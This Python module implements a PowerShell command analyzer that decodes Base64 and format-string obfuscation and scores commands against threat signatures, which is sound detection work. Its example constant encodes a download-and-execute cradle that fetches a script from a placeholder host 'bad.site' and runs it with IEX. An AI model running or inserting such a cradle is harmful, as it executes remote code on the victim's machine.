"""PowerShell Analyzer Service
"""
import re
import time
import json
import secrets
import string
import base64
from services.session_manager import get_supabase_client
from config.settings import CACHE_DURATION

from services.detectors.obfuscation_detector import deobfuscate
from services.detectors.encoded_command_detector import detect_encoded_command
from services.detectors.double_encoded_detector import detect_double_encoded_command

# ✅ Example command that doesn't count towards quota
EXAMPLE_ENCODED_COMMAND = 'powershell -EncodedCommand "SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGIAYQBkAC4AcwBpAHQAZQAvAHAAYQB5AGwAbwBhAGQALgBwAHMAMQAnACkA" -noExit'
import Levenshtein


ENCODED_COMMAND_PATTERN = r'[\u002D\u2013\u2014\u2015](?:ec|e(?:n(?:c(?:o(?:d(?:e(?:d(?:c(?:o(?:m(?:m(?:a(?:n(?:d)?)?)?)?)?)?)?)?)?)?)?)?)?)\s+["\']?\s*([a-z0-9+/]{20,}={0,2})'

try:
    import ppdeep
    PPDEEP_AVAILABLE = True
except ImportError:
    PPDEEP_AVAILABLE = False
   


try:
    import pyminusone
    PYMINUSONE_AVAILABLE = True
except ImportError:
    try:
        from services.deobfuscator import deobfuscate_powershell as pyminusone_deobfuscate
        pyminusone = type('obj', (object,), {'deobfuscate_powershell': pyminusone_deobfuscate})()
        PYMINUSONE_AVAILABLE = True
        
    except ImportError:
        PYMINUSONE_AVAILABLE = False
        


signatures_cache = None
cache_timestamp = 0


def generate_short_id(length: int = 8) -> str:
    characters = string.ascii_lowercase + string.digits
    return ''.join(secrets.choice(characters) for _ in range(length))


async def load_signatures_from_db(user_id: str = None) -> list:
    
    global signatures_cache, cache_timestamp
    
    try:
        now = int(time.time() * 1000)
        
       
        is_premium_user = False
        if user_id:
            supabase = get_supabase_client()
            profile_response = supabase.table('profiles').select('is_premium_user').eq('id', user_id).single().execute()
            if profile_response.data:
                is_premium_user = profile_response.data.get('is_premium_user', False)
        
       
        cache_key = f"signatures_{'premium' if is_premium_user else 'free'}"
        
        if signatures_cache and cache_timestamp and cache_key in signatures_cache and (now - cache_timestamp) < CACHE_DURATION:
            return signatures_cache[cache_key]
        
        supabase = get_supabase_client()
        
        
        query = supabase.table('powershell_signatures').select('*').eq('is_active', True)
        
        if not is_premium_user:
            
            query = query.eq('is_premium_indicator', False)
        
        response = query.order('basescore', desc=True).execute()
        
        if response.data:
            converted_signatures = []
            for sig in response.data:
                converted_signatures.append({
                    "name": sig.get("name", "Unknown"),
                    "patterns": sig.get("patterns", []) if isinstance(sig.get("patterns"), list) else [],
                    "severity": sig.get("severity", "unknown"),
                    "tactics": sig.get("tactics", []) if isinstance(sig.get("tactics"), list) else [],
                    "techniques": sig.get("techniques", []) if isinstance(sig.get("techniques"), list) else [],
                    "score": float(sig.get("basescore", 0)),
                    "description": sig.get("description", "No description available"),
                    "reference": sig.get("reference", []) if isinstance(sig.get("reference"), list) else [],
                    "max_match": int(sig.get("max_match", 1)),
                    "link": sig.get("link") if sig.get("link") else None,
                    "is_premium_indicator": sig.get("is_premium_indicator", False)
                })
            
            
            if not signatures_cache:
                signatures_cache = {}
            
            signatures_cache[cache_key] = converted_signatures
            cache_timestamp = now
            
            return converted_signatures
        else:
            print("No signatures found in database")
            return []
            
    except Exception as error:
        print(f"[ERROR] Loading signatures: {type(error).__name__}")
        return []


def decode_base64_utf16(encoded_str: str) -> str:
    try:
        encoded_str = encoded_str.replace(' ', '').replace('\n', '').replace('\r', '')
        
        if not encoded_str:
            return ""
        
        decoded_bytes = base64.b64decode(encoded_str + '===', validate=False)
        decoded_text = decoded_bytes.decode('utf-16-le', errors='ignore')
        
        return decoded_text
        
    except Exception:
        try:
            decoded_bytes = base64.b64decode(encoded_str, validate=False)
            return decoded_bytes.decode('utf-16-le', errors='ignore')
        except Exception:
            return ""


def deobfuscate_powershell(command: str) -> tuple:
   
    has_leading_ampersand = command.startswith('&')
    
   
    command_to_process = command

    max_decode_iterations = 5
    iteration = 0
    obfuscation_type = "none"
    all_decoded_layers = []
    successfully_decoded = False
    
   
    
   
    while iteration < max_decode_iterations:
        encoded_match = re.search(
            ENCODED_COMMAND_PATTERN,
            command_to_process,
            re.IGNORECASE
        )
        
        if encoded_match:
            iteration += 1
            payload_b64 = encoded_match.group(1)
            
            
            
            decoded_payload = decode_base64_utf16(payload_b64)
            
           
            
            is_valid_decode = (
                len(decoded_payload) > 0 and
                decoded_payload != payload_b64
            )
            
            if is_valid_decode:
                all_decoded_layers.append({
                    "iteration": iteration,
                    "decoded": decoded_payload
                })
                
              
                
                command_to_process = decoded_payload
                obfuscation_type = "base64_decoded"
                successfully_decoded = True
                
                has_more = re.search(
                    ENCODED_COMMAND_PATTERN,
                    decoded_payload,
                    re.IGNORECASE
                )
                
                if not has_more:
                    break
                else:
                    # Found nested encoding, continue decoding
                    pass
            else:
                iteration -= 1
                break
        else:
            if iteration > 0:
                break
            break
    
    base64_iterations = iteration if successfully_decoded else 0

   
    if PYMINUSONE_AVAILABLE:
        try:
            deobf = pyminusone.deobfuscate_powershell(command_to_process)

            if deobf and deobf != command_to_process:
                cleaned = deobfuscate(deobf)

                if cleaned != command_to_process and '{ ' not in cleaned and ' }' not in cleaned:
                    if obfuscation_type != "base64_decoded":
                        obfuscation_type = "format_deobfuscated"
                    
                    max_iterations = 3
                    current = cleaned
                    
                    for fmt_iteration in range(max_iterations):
                        if '"-f' not in current and '" -f' not in current:
                            break
                        
                        try:
                            recursive_result = pyminusone.deobfuscate_powershell(current)
                            recursive_cleaned = deobfuscate(recursive_result)
                            
                            if len(recursive_cleaned) < len(current) and recursive_cleaned != current:
                                current = recursive_cleaned
                            else:
                                break
                        except Exception as e:
                            break
                    
                    final_result = current
                    
                    
                    return final_result, base64_iterations, obfuscation_type, all_decoded_layers
        except Exception as e:
            pass

    try:
        from services.deobfuscator import manual_deobfuscate_format_strings
        manual_result = manual_deobfuscate_format_strings(command_to_process)

        if manual_result and manual_result != command_to_process:
            if obfuscation_type != "base64_decoded":
                obfuscation_type = "format_deobfuscated"
            
            cleaned_manual = deobfuscate(manual_result)
            
          
            return cleaned_manual, base64_iterations, obfuscation_type, all_decoded_layers
    except Exception as e:
        pass

    if base64_iterations > 0:
        return command_to_process, base64_iterations, obfuscation_type, all_decoded_layers
    
   
    return command, 0, "none", []


def detect_obfuscation(original_command: str, deobfuscated_command: str, threshold: float = 0.30) -> bool:
    """
    Detects obfuscation using Levenshtein distance
    """
    if original_command == deobfuscated_command:
        return False
    
    
    distance = Levenshtein.distance(original_command, deobfuscated_command)
    
    
    similarity = Levenshtein.ratio(original_command, deobfuscated_command)
    
   
    is_obfuscated = similarity < (1.0 - threshold)
    
    return is_obfuscated


def analyze_command_patterns(command: str, signatures: list) -> dict:
    """
    Analyzes PowerShell command with obfuscation handling
    """
    custom_deobfuscated = deobfuscate(command)
    encoding_result = detect_encoded_command(custom_deobfuscated)
    
    decoded_command = None
    double_decoded_command = None
    
    if encoding_result["is_encoded"]:
        decoded_command = encoding_result.get("decoded_preview")
        
        
        if decoded_command:
            double_encoding_result = detect_double_encoded_command(
                command=command,
                decoded_command=decoded_command,
                decode_iterations=1
            )
            
            if double_encoding_result["is_double_encoded"]:
                double_decoded_command = double_encoding_result.get("second_level_decoded")
    
    detected_signatures = []
    total_score = 0.0
    tactics_set = set()
    techniques_set = set()
    
    original_command = command
    
    deobfuscated_command, decode_iterations, obfuscation_type, all_decoded_layers = deobfuscate_powershell(command)
    has_deobfuscation = deobfuscated_command != command
    
    first_decoded_layer = None
    second_decoded_layer = None
    
    if all_decoded_layers:
        if len(all_decoded_layers) >= 1:
            first_decoded_layer = all_decoded_layers[0]["decoded"]
        if len(all_decoded_layers) >= 2:
            second_decoded_layer = all_decoded_layers[1]["decoded"]
    
    
    
    
   
    
   
    is_obfuscated = detect_obfuscation(original_command, custom_deobfuscated, threshold=0.30)
    
    if is_obfuscated:
        
        obfuscation_sig = next((sig for sig in signatures if sig.get("name") == "Obfuscation Detected"), None)
        
        if obfuscation_sig:
            obfuscation_detected = {
                "name": obfuscation_sig["name"],
                "description": obfuscation_sig["description"],
                "severity": obfuscation_sig["severity"],
                "base_score": obfuscation_sig["score"],
                "matches_found": 1,
                "total_score": obfuscation_sig["score"],
                "max_match_allowed": obfuscation_sig["max_match"],
                "pattern": "__OBFUSCATION_CHECK__",
                "matches_details": [
                    {
                        "matched_text": f"Format string obfuscation: {original_command[:80]}... → {custom_deobfuscated[:80]}...",
                        "position": {"start": 0, "end": len(original_command)},
                        "match_number": 1,
                        "matched_in": "original"
                    }
                ],
                "tactics": obfuscation_sig.get("tactics", []),
                "techniques": obfuscation_sig.get("techniques", []),
                "reference": obfuscation_sig.get("reference", []),
                "link": obfuscation_sig.get("link"),
                "is_premium_indicator": obfuscation_sig.get("is_premium_indicator", False),
                "found_in_deobfuscated": False
            }
            
            detected_signatures.append(obfuscation_detected)
            tactics_set.update(obfuscation_sig.get("tactics", []))
            techniques_set.update(obfuscation_sig.get("techniques", []))
            total_score += obfuscation_sig["score"]
            
            
    
    
    if decode_iterations >= 2:
        double_encoded_sig = next((sig for sig in signatures if sig.get("name") == "Double Encoded Command Detected"), None)
        
        if double_encoded_sig:
            
            detected_signatures.append({
                "name": "Double Encoded Command Detected",
                "description": f"Multiple layers of Base64 encoding detected: {decode_iterations} nested -EncodedCommand parameters found",
                "severity": double_encoded_sig["severity"],
                "base_score": double_encoded_sig["score"],
                "matches_found": 1,
                "total_score": double_encoded_sig["score"],
                "max_match_allowed": 1,
                "pattern": f"{decode_iterations}_layer_encoding",
                "matches_details": [{
                    "matched_text": f"Layer 1: {first_decoded_layer[:80] if first_decoded_layer else 'N/A'}...",
                    "position": {"start": 0, "end": len(original_command)},
                    "match_number": 1,
                    "matched_in": "original"
                }],
                "tactics": double_encoded_sig.get("tactics", ["Defense Evasion"]),
                "techniques": double_encoded_sig.get("techniques", ["T1027.010", "T1140"]),
                "reference": double_encoded_sig.get("reference", []),
                "link": double_encoded_sig.get("link"),
                "is_premium_indicator": False,
                "found_in_deobfuscated": False
            })
            
            tactics_set.update(double_encoded_sig.get("tactics", ["Defense Evasion"]))
            techniques_set.update(double_encoded_sig.get("techniques", ["T1027.010", "T1140"]))
            total_score += double_encoded_sig["score"]
            
    
    encoding_detection = detect_encoded_command(original_command)
    
    
    
    if encoding_detection["is_encoded"]:
        encoded_sig = next((sig for sig in signatures if sig.get("name") == "Encoded Command Detected"), None)
        
        if encoded_sig:
            detected_signatures.append({
                "name": "Encoded Command Detected",
                "description": f"Command encoding detected: {encoding_detection['indicator']} (confidence: {encoding_detection['confidence']:.0%})",
                "severity": encoded_sig["severity"],
                "base_score": encoded_sig["score"],
                "matches_found": 1,
                "total_score": encoded_sig["score"],
                "max_match_allowed": 1,
                "pattern": encoding_detection["type"],
                "matches_details": [{
                    "matched_text": encoding_detection.get("decoded_preview", "Unable to decode"),
                    "position": {"start": 0, "end": len(original_command)},
                    "match_number": 1,
                    "matched_in": "original"
                }],
                "tactics": encoded_sig.get("tactics", ["Defense Evasion"]),
                "techniques": encoded_sig.get("techniques", ["T1027", "T1027.001", "T1140"]),
                "reference": encoded_sig.get("reference", []),
                "link": encoded_sig.get("link"),
                "is_premium_indicator": False,
                "found_in_deobfuscated": False
            })
            
            tactics_set.update(encoded_sig.get("tactics", ["Defense Evasion"]))
            techniques_set.update(encoded_sig.get("techniques", ["T1027", "T1027.001", "T1140"]))
            total_score += encoded_sig["score"]
            

    
    has_encoded_command_indicator = any(
        sig.get("name") == "Encoded Command Detected" 
        for sig in detected_signatures
    )
    
    
    commands_to_analyze = [original_command]
    
    # Add base64 decoded command from deobfuscate_powershell
    if decode_iterations >= 1 and deobfuscated_command and deobfuscated_command != command:
        commands_to_analyze.append(deobfuscated_command)
    
    # Add decoded_command from detect_encoded_command (may be different/more complete)
    if decoded_command and decoded_command != command and decoded_command not in commands_to_analyze:
        commands_to_analyze.append(decoded_command)
    
    # Add custom deobfuscated (format strings, etc)
    if custom_deobfuscated != command and custom_deobfuscated not in commands_to_analyze:
        commands_to_analyze.append(custom_deobfuscated)
    
    # Add double decoded if available
    if double_decoded_command and double_decoded_command not in commands_to_analyze:
        commands_to_analyze.append(double_decoded_command)
        
    for signature in signatures:
        if signature.get("name") in ["Obfuscation Detected", "Encoded Command Detected", "Double Encoded Command Detected"]:
            continue
        
        if signature.get("name") == "Long base64 strings" and has_encoded_command_indicator:
            continue
        
        all_signature_matches = []
        matched_pattern = None
        matched_in_decoded = False
        
        for cmd_to_test in commands_to_analyze:
            # Mark as decoded if it's any version other than the original
            is_decoded_version = (cmd_to_test != original_command)
            
            for pattern in signature["patterns"]:
                try:
                    regex = re.compile(pattern, re.IGNORECASE | re.MULTILINE | re.DOTALL)
                    pattern_matches = list(regex.finditer(cmd_to_test))
                    
                    if pattern_matches:
                        if matched_pattern is None:
                            matched_pattern = pattern
                        
                        if is_decoded_version:
                            matched_in_decoded = True
                        
                        for match in pattern_matches:
                            matched_text = match.group(0)
                            match_start = match.start()
                            match_end = match.end()
                            
                            all_signature_matches.append({
                                "matched_text": matched_text,
                                "position": {
                                    "start": match_start,
                                    "end": match_end
                                },
                                "matched_in": "deobfuscated" if is_decoded_version else "original"
                            })
                            

                except re.error:
                    continue

        unique_matches = []
        seen_positions = set()
        
        for match_info in all_signature_matches:
            position_key = (
                match_info["position"]["start"],
                match_info["position"]["end"],
                match_info["matched_text"],
                match_info["matched_in"]
            )
            if position_key not in seen_positions:
                seen_positions.add(position_key)
                unique_matches.append(match_info)
        
        matches_found = min(len(unique_matches), signature["max_match"])
        final_matches = unique_matches[:matches_found]
        
        if matches_found > 0:
            signature_total_score = signature["score"] * matches_found
            
            detected_signature = {
                "name": signature["name"],
                "description": signature["description"],
                "severity": signature["severity"],
                "base_score": signature["score"],
                "matches_found": matches_found,
                "total_score": signature_total_score,
                "max_match_allowed": signature["max_match"],
                "pattern": matched_pattern or signature["patterns"][0] if signature["patterns"] else "Unknown pattern",
                "matches_details": [
                    {
                        "matched_text": match_info["matched_text"],
                        "position": match_info["position"],
                        "match_number": i + 1,
                        "matched_in": match_info["matched_in"]
                    }
                    for i, match_info in enumerate(final_matches)
                ],
                "tactics": signature["tactics"],
                "techniques": signature["techniques"],
                "reference": signature.get("reference", []),
                "link": signature.get("link"),
                "is_premium_indicator": signature.get("is_premium_indicator", False),
                "found_in_deobfuscated": matched_in_decoded
            }
            
            detected_signatures.append(detected_signature)
            
            tactics_set.update(signature["tactics"])
            techniques_set.update(signature["techniques"])
            total_score += signature_total_score
    
  
   
    return {
        "detected_signatures": detected_signatures,
        "total_score": total_score,
        "tactics": list(tactics_set),
        "techniques": list(techniques_set),
        "decoded_command": decoded_command,
        "double_decoded_command": double_decoded_command,
        "deobfuscated_command": custom_deobfuscated if custom_deobfuscated != command else None
    }


def calculate_severity_and_risk(total_score: float) -> str:
    """Calcula severidade baseado no score total"""
    severity = "very_low"
    if total_score >= 8.1:
        severity = "critical"
    elif total_score >= 6.1:
        severity = "high"
    elif total_score >= 4.1:
        severity = "medium"
    elif total_score >= 2.1:
        severity = "low"
    return severity


async def save_analysis_to_db(
    command: str,
    analysis_result: dict,
    user_id: str = None,
    session_id: str = None,
    ip_address: str = None,
    country: str = None,
    search_type: str = "API",
    user_agent: str = "FastAPI-Client",
    is_cache: bool = False
) -> dict:
    """Salva análise no banco de dados"""
    try:
        supabase = get_supabase_client()
        short_id = generate_short_id()
        
        ip_country = country if country and country != 'Unknown' else None
        
        # Extract decoded content
        deobfuscated_cmd = analysis_result.get("deobfuscated_command")
        decoded_cmd = analysis_result.get("decoded_command")
        double_decoded_cmd = analysis_result.get("double_decoded_command")
        
        # ✅ Check if this is the example command
        is_example_command = command.strip() == EXAMPLE_ENCODED_COMMAND.strip()
        
        # ✅ NEW: Determine if analysis has actual decoded content
        # Example command doesn't count towards quota
        has_decoded_content = bool(
            (decoded_cmd or double_decoded_cmd or deobfuscated_cmd) and not is_example_command
        )
        
        
        insert_data = {
            "command": command,
            "decoded_command": decoded_cmd,
            "double_decoded_command": double_decoded_cmd,
            "obfuscated_command": deobfuscated_cmd,
            "has_decoded_content": has_decoded_content,  # ✅ NEW
            "risk_score": round(analysis_result["total_score"], 1),
            "severity": analysis_result["severity"],
            "signatures_detected": analysis_result["detected_signatures"],
            "tactics": analysis_result["tactics"],
            "techniques": analysis_result["techniques"],
            "cmdlets_detected": analysis_result.get("cmdlets_detected", []),
            "ip_address": ip_address,
            "ip_country": ip_country,
            "search_type": search_type,
            "user_agent": user_agent,
            "short_id": short_id,
            "is_cache": is_cache
        }
        
        if user_id:
            insert_data["user_id"] = user_id
        if session_id:
            insert_data["session_id"] = session_id
        
        insert_data = {k: v for k, v in insert_data.items() if v is not None}
        
        db_response = supabase.table('powershell_analyses').insert(insert_data).execute()
        if db_response.data:
            return {
                "success": True,
                "db_id": db_response.data[0].get('id'),
                "uuid": db_response.data[0].get('uuid'),
                "short_id": short_id,
            }
        else:
            return {"success": False, "error": "Failed to save analysis"}
            
    except Exception as db_error:
        print(f"[ERROR] Database error: {type(db_error).__name__}")
        return {"success": False, "error": str(db_error)}


def clear_signatures_cache():
    """Limpa o cache de assinaturas"""
    global signatures_cache, cache_timestamp
    signatures_cache = None
    cache_timestamp = 0

